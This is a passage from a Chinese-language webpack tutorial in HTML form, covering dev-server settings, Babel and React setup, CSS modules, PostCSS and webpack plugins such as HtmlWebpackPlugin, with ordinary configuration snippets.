webpack-dev-server</div></pre></td></tr></table></figure><p>devserver作为webpack配置选项中的一项，以下是它的一些配置选项，更多配置可参考这里<br><strong>contentBase:</strong><br>默认webpack-dev-server会为根文件夹提供本地服务器，如果想为另外一个目录下的文件提供本地服务器，应该在这里设置其所在目录（本例设置到“public”目录）<br><strong>port:</strong><br>设置默认监听端口，如果省略，默认为”8080“<br><strong>inline:</strong><br>设置为true，当源文件改变时会自动刷新页面<br><strong>historyApiFallback:</strong><br>在开发单页应用时非常有用，它依赖于HTML5 history API，如果设置为true，所有的跳转将指向index.html</p><p>把这些命令加到webpack的配置文件中，现在的配置文件webpack.config.js如下所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line">  devtool: &apos;eval-source-map&apos;,</div><div class="line"></div><div class="line">  entry:  __dirname + &quot;/app/main.js&quot;,</div><div class="line">  output: &#123;</div><div class="line">    path: __dirname + &quot;/public&quot;,</div><div class="line">    filename: &quot;bundle.js&quot;</div><div class="line">  &#125;,</div><div class="line"></div><div class="line">  devServer: &#123;</div><div class="line">    contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">    historyApiFallback: true,//不跳转</div><div class="line">    inline: true//实时刷新</div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>在package.json中的scripts对象中添加如下命令，用以开启本地服务器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&quot;scripts&quot;: &#123;</div><div class="line">   &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</div><div class="line">   &quot;start&quot;: &quot;webpack&quot;,</div><div class="line">   &quot;server&quot;: &quot;webpack-dev-server --open&quot;</div><div class="line"> &#125;,</div></pre></td></tr></table></figure></p><p>在终端中输入npm run server即可在本地的8080端口查看结果<br><img src="//upload-images.jianshu.io/upload_images/1031000-47d5bea9ef177187.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="这里写图片描述"></p><h3 id="Loaders"><a href="#Loaders" class="headerlink" title="Loaders"></a>Loaders</h3><p>Loaders是webpack提供的最激动人心的功能之一了。通过使用不同的loader，webpack有能力调用外部的脚本或工具，实现对不同格式的文件的处理，比如说分析转换scss为css，或者把下一代的JS文件（ES6，ES7)转换为现代浏览器兼容的JS文件，对React的开发而言，合适的Loaders可以把React的中用到的JSX文件转换为JS文件。</p><p>Loaders需要单独安装并且需要在webpack.config.js中的modules关键字下进行配置，Loaders的配置包括以下几方面：<br><strong>test：</strong><br>一个用以匹配loaders所处理文件的拓展名的正则表达式（必须）<br><strong>loader：</strong>loader的名称（必须）<br><strong>include/exclude:</strong><br>手动添加必须处理的文件（文件夹）或屏蔽不需要处理的文件（文件夹）（可选）；<br><strong>query：</strong><br>为loaders提供额外的设置选项（可选）</p><p>不过在配置loader之前，我们把Greeter.js里的问候消息放在一个单独的JSON文件里,并通过合适的配置使Greeter.js可以读取该JSON文件的值，各文件修改后的代码如下：</p><p>在app文件夹中创建带有问候信息的JSON文件(命名为config.json)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;greetText&quot;: &quot;Hi there and greetings from JSON!&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>更新后的Greeter.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var config = require(&apos;./config.json&apos;);</div><div class="line"></div><div class="line">module.exports = function() &#123;</div><div class="line">  var greet = document.createElement(&apos;div&apos;);</div><div class="line">  greet.textContent = config.greetText;</div><div class="line">  return greet;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p><strong>注</strong> 由于webpack3.<em>/webpack2.</em>已经内置可处理JSON文件，这里我们无需再添加webpack1.*需要的json-loader。在看如何具体使用loader之前我们先看看Babel是什么？</p></blockquote><h3 id="Babel"><a href="#Babel" class="headerlink" title="Babel"></a>Babel</h3><p>Babel其实是一个编译JavaScript的平台，它可以编译代码帮你达到以下目的：<br>让你能使用最新的JavaScript代码（ES6，ES7…），而不用管新标准是否被当前使用的浏览器完全支持；<br>让你能使用基于JavaScript进行了拓展的语言，比如React的JSX；</p><h3 id="Babel的安装与配置"><a href="#Babel的安装与配置" class="headerlink" title="Babel的安装与配置"></a>Babel的安装与配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// npm一次性安装多个依赖模块，模块之间用空格隔开</div><div class="line">npm install --save-dev babel-core babel-loader babel-preset-env babel-preset-react</div></pre></td></tr></table></figure><p>在webpack中配置Babel的方法如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/public&quot;,//打包后的文件存放的地方</div><div class="line">        filename: &quot;bundle.js&quot;//打包后输出文件的文件名</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;eval-source-map&apos;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true,//不跳转</div><div class="line">        inline: true//实时刷新</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;,</div><div class="line">                    options: &#123;</div><div class="line">                        presets: [</div><div class="line">                            &quot;env&quot;, &quot;react&quot;</div><div class="line">                        ]</div><div class="line">                    &#125;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>现在你的webpack的配置已经允许你使用ES6以及JSX的语法了。继续用上面的例子进行测试，不过这次我们会使用React，记得先安装 React 和 React-DOM<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save react react-dom</div></pre></td></tr></table></figure></p><p>接下来我们使用ES6的语法，更新Greeter.js并返回一个React组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">//Greeter,js</div><div class="line">import React, &#123;Component&#125; from &apos;react&apos;</div><div class="line">import config from &apos;./config.json&apos;;</div><div class="line"></div><div class="line">class Greeter extends Component&#123;</div><div class="line">  render() &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &#123;config.greetText&#125;</div><div class="line">      &lt;/div&gt;</div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">export default Greeter</div></pre></td></tr></table></figure></p><p>修改main.js如下，使用ES6的模块定义和渲染Greeter模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// main.js</div><div class="line">import React from &apos;react&apos;;</div><div class="line">import &#123;render&#125; from &apos;react-dom&apos;;</div><div class="line">import Greeter from &apos;./Greeter&apos;;</div><div class="line"></div><div class="line">render(&lt;Greeter /&gt;, document.getElementById(&apos;root&apos;));</div></pre></td></tr></table></figure></p><p>重新使用npm start打包，如果之前打开的本地服务器没有关闭，你应该可以在localhost:8080下看到与之前一样的内容，这说明react和es6被正常打包了。</p><p><img src="//upload-images.jianshu.io/upload_images/1031000-7d2a7769709a2e36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/278" alt="这里写图片描述"></p><p>Babel其实可以完全在 webpack.config.js 中进行配置，但是考虑到babel具有非常多的配置选项，在单一的webpack.config.js文件中进行配置往往使得这个文件显得太复杂，因此一些开发者支持把babel的配置选项放在一个单独的名为 “.babelrc” 的配置文件中。我们现在的babel的配置并不算复杂，不过之后我们会再加一些东西，因此现在我们就提取出相关部分，分两个配置文件进行配置（webpack会自动调用.babelrc里的babel配置选项），如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line">    entry: __dirname + &quot;/app/main.js&quot;,//已多次提及的唯一入口文件</div><div class="line">    output: &#123;</div><div class="line">        path: __dirname + &quot;/public&quot;,//打包后的文件存放的地方</div><div class="line">        filename: &quot;bundle.js&quot;//打包后输出文件的文件名</div><div class="line">    &#125;,</div><div class="line">    devtool: &apos;eval-source-map&apos;,</div><div class="line">    devServer: &#123;</div><div class="line">        contentBase: &quot;./public&quot;,//本地服务器所加载的页面所在的目录</div><div class="line">        historyApiFallback: true,//不跳转</div><div class="line">        inline: true//实时刷新</div><div class="line">    &#125;,</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//.babelrc</div><div class="line">&#123;</div><div class="line">  &quot;presets&quot;: [&quot;react&quot;, &quot;env&quot;]</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>到目前为止，我们已经知道了，对于模块，Webpack能提供非常强大的处理功能，那那些是模块呢。</p><h3 id="一切皆模块"><a href="#一切皆模块" class="headerlink" title="一切皆模块"></a>一切皆模块</h3><p>Webpack有一个不可不说的优点，它把所有的文件都都当做模块处理，JavaScript代码，CSS和fonts以及图片等等通过合适的loader都可以被处理。</p><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>webpack提供两个工具处理样式表，css-loader 和 style-loader，二者处理的任务不同，css-loader使你能够使用类似@import 和 url(…)的方法实现 require()的功能,style-loader将所有的计算后的样式加入页面中，二者组合在一起使你能够把样式表嵌入webpack打包后的JS文件中。</p><p>继续上面的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//安装</div><div class="line">npm install --save-dev style-loader css-loader</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//使用</div><div class="line">module.exports = &#123;</div><div class="line"></div><div class="line">   ...</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><blockquote><p>请注意这里对同一个文件引入多个loader的方法。</p></blockquote><p>接下来，在app文件夹里创建一个名字为”main.css”的文件，对一些元素设置样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* main.css */</span></div><div class="line"><span class="selector-tag">html</span> &#123;</div><div class="line">  <span class="attribute">box-sizing</span>: border-box;</div><div class="line">  <span class="attribute">-ms-text-size-adjust</span>: <span class="number">100%</span>;</div><div class="line">  <span class="attribute">-webkit-text-size-adjust</span>: <span class="number">100%</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">*, *<span class="selector-pseudo">:before</span>, *<span class="selector-pseudo">:after</span> &#123;</div><div class="line">  <span class="attribute">box-sizing</span>: inherit;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">body</span> &#123;</div><div class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">font-family</span>: <span class="string">'Helvetica Neue'</span>, Helvetica, Arial, sans-serif;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>, <span class="selector-tag">p</span>, <span class="selector-tag">ul</span> &#123;</div><div class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</div><div class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们这里例子中用到的webpack只有单一的入口，其它的模块需要通过 import, require, url等与入口文件建立其关联，为了让webpack能找到”main.css“文件，我们把它导入”main.js “中，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//main.js</div><div class="line">import React from &apos;react&apos;;</div><div class="line">import &#123;render&#125; from &apos;react-dom&apos;;</div><div class="line">import Greeter from &apos;./Greeter&apos;;</div><div class="line"></div><div class="line">import &apos;./main.css&apos;;//使用require导入css文件</div><div class="line"></div><div class="line">render(&lt;Greeter /&gt;, document.getElementById(&apos;root&apos;));</div></pre></td></tr></table></figure><blockquote><p>通常情况下，css会和js打包到同一个文件中，并不会打包为一个单独的css文件，不过通过合适的配置webpack也可以把css打包为单独的文件的。</p></blockquote><p>上面的代码说明webpack是怎么把css当做模块看待的，咱们继续看一个更加真实的css模块实践。</p><h3 id="CSS-module"><a href="#CSS-module" class="headerlink" title="CSS module"></a>CSS module</h3><p>在过去的一些年里，JavaScript通过一些新的语言特性，更好的工具以及更好的实践方法（比如说模块化）发展得非常迅速。模块使得开发者把复杂的代码转化为小的，干净的，依赖声明明确的单元，配合优化工具，依赖管理和加载管理可以自动完成。<br>不过前端的另外一部分，CSS发展就相对慢一些，大多的样式表却依旧巨大且充满了全局类名，维护和修改都非常困难。</p><p>被称为CSS modules的技术意在把JS的模块化思想带入CSS中来，通过CSS模块，所有的类名，动画名默认都只作用于当前模块。Webpack对CSS模块化提供了非常好的支持，只需要在CSS loader中进行简单配置即可，然后就可以直接把CSS的类名传递到组件的代码中，这样做有效避免了全局污染。具体的代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">module.exports = &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true, // 指定启用css modules</div><div class="line">                            localIdentName: &apos;[name]__[local]--[hash:base64:5]&apos; // 指定css的类名格式</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>我们在app文件夹下创建一个Greeter.css文件来进行一下测试</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Greeter.css */</span></div><div class="line"><span class="selector-class">.root</span> &#123;</div><div class="line">  <span class="attribute">background-color</span>: <span class="number">#eee</span>;</div><div class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</div><div class="line">  <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#ccc</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>导入.root到Greeter.js中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import React, &#123;Component&#125; from &apos;react&apos;;</div><div class="line">import config from &apos;./config.json&apos;;</div><div class="line">import styles from &apos;./Greeter.css&apos;;//导入</div><div class="line"></div><div class="line">class Greeter extends Component&#123;</div><div class="line">  render() &#123;</div><div class="line">    return (</div><div class="line">      &lt;div className=&#123;styles.root&#125;&gt; //使用cssModule添加类名的方法</div><div class="line">        &#123;config.greetText&#125;</div><div class="line">      &lt;/div&gt;</div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">export default Greeter</div></pre></td></tr></table></figure></p><p>放心使用把，相同的类名也不会造成不同组件之间的污染。<br>CSS modules 也是一个很大的主题，有兴趣的话可以去其官方文档了解更多。</p><h3 id="CSS预处理器"><a href="#CSS预处理器" class="headerlink" title="CSS预处理器"></a>CSS预处理器</h3><p>Sass 和 Less 之类的预处理器是对原生CSS的拓展，它们允许你使用类似于variables, nesting, mixins, inheritance等不存在于CSS中的特性来写CSS，CSS预处理器可以这些特殊类型的语句转化为浏览器可识别的CSS语句，</p><p>你现在可能都已经熟悉了，在webpack里使用相关loaders进行配置就可以使用了，以下是常用的CSS 处理loaders:<br>Less Loader<br>Sass Loader<br>Stylus Loader</p><p>不过其实也存在一个CSS的处理平台-PostCSS，它可以帮助你的CSS实现更多的功能，在其官方文档可了解更多相关知识。</p><p>举例来说如何使用PostCSS，我们使用PostCSS来为CSS代码自动添加适应不同浏览器的CSS前缀。</p><p>首先安装postcss-loader 和 autoprefixer（自动添加前缀的插件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev postcss-loader autoprefixer</div></pre></td></tr></table></figure><p>接下来，在webpack配置文件中添加postcss-loader，在根目录新建postcss.config.js,并添加如下代码之后，重新使用npm start打包时，你写的css会自动根据Can i use里的数据添加不同前缀了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">//webpack.config.js</div><div class="line">module.exports = &#123;</div><div class="line">    ...</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true</div><div class="line">                        &#125;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;postcss-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// postcss.config.js</div><div class="line">module.exports = &#123;</div><div class="line">    plugins: [</div><div class="line">        require(&apos;autoprefixer&apos;)</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>至此，本文已经谈论了处理JS的Babel和处理CSS的PostCSS的基本用法，它们其实也是两个单独的平台，配合webpack可以很好的发挥它们的作用。接下来介绍Webpack中另一个非常重要的功能-Plugins</p><h3 id="插件（Plugins）"><a href="#插件（Plugins）" class="headerlink" title="插件（Plugins）"></a>插件（Plugins）</h3><p>插件（Plugins）是用来拓展Webpack功能的，它们会在整个构建过程中生效，执行相关的任务。<br>Loaders和Plugins常常被弄混，但是他们其实是完全不同的东西，可以这么来说，loaders是在打包构建过程中用来处理源文件的（JSX，Scss，Less..），一次处理一个，插件并不直接操作单个文件，它直接对整个构建过程其作用。</p><p>Webpack有很多内置插件，同时也有很多第三方插件，可以让我们完成更加丰富的功能。</p><h3 id="使用插件的方法"><a href="#使用插件的方法" class="headerlink" title="使用插件的方法"></a>使用插件的方法</h3><p>要使用某个插件，我们需要通过npm安装它，然后要做的就是在webpack配置中的plugins关键字部分添加该插件的一个实例（plugins是一个数组）继续上面的例子，我们添加了一个给打包后代码添加<a href="https://link.jianshu.com?t=https://webpack.js.org/plugins/banner-plugin/" target="_blank" rel="external">版权声明</a>的插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">const webpack = require(&apos;webpack&apos;);</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">...</div><div class="line">    module: &#123;</div><div class="line">        rules: [</div><div class="line">            &#123;</div><div class="line">                test: /(\.jsx|\.js)$/,</div><div class="line">                use: &#123;</div><div class="line">                    loader: &quot;babel-loader&quot;</div><div class="line">                &#125;,</div><div class="line">                exclude: /node_modules/</div><div class="line">            &#125;,</div><div class="line">            &#123;</div><div class="line">                test: /\.css$/,</div><div class="line">                use: [</div><div class="line">                    &#123;</div><div class="line">                        loader: &quot;style-loader&quot;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;css-loader&quot;,</div><div class="line">                        options: &#123;</div><div class="line">                            modules: true</div><div class="line">                        &#125;</div><div class="line">                    &#125;, &#123;</div><div class="line">                        loader: &quot;postcss-loader&quot;</div><div class="line">                    &#125;</div><div class="line">                ]</div><div class="line">            &#125;</div><div class="line">        ]</div><div class="line">    &#125;,</div><div class="line">    plugins: [</div><div class="line">        new webpack.BannerPlugin(&apos;版权所有，翻版必究&apos;)</div><div class="line">    ],</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>这就是webpack插件的基础用法了，下面给大家推荐几个常用的插件</p><h3 id="HtmlWebpackPlugin"><a href="#HtmlWebpackPlugin" class="headerlink" title="HtmlWebpackPlugin"></a>HtmlWebpackPlugin</h3><p>这个插件的作用是依据一个简单的index.html模板，生成一个自动引用你打包后的JS文件的新index.html。这在每次生成的js文件名称不同时非常有用（比如添加了hash值）</p><p><strong>安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install --save-dev html-webpack-plugin</div></pre></td></tr></table></figure></p><p>这个插件自动完成了我们之前手动做的一些事情，在正式使用之前需要对一直以来的项目结构做一些更改：<br>1.移除public文件夹，利用此插件，index.html文件会自动生成，此外CSS已经通过前面的操作打包到JS中了。<br>2.在app目录下，创建一个index.tmpl.html文件模板，这个模板包含title等必须元素，在编译过程中，插件会依据此模板生成最终的html页面，会自动添加所依赖的 css, js，favicon等文件，index.tmpl.html中的模板源代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">  &lt;head&gt;</div><div class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">    &lt;title&gt;Webpack Sample Project&lt;/title&gt;</div><div class="line">  &lt;/head&gt;</div><div class="line">  &lt;body&gt;</div><div class="line">    &lt;div id=&apos;root&apos;&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>3.更新webpack的配置文件，方法同上,新建一个build文件夹用来存放最终的输出文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div 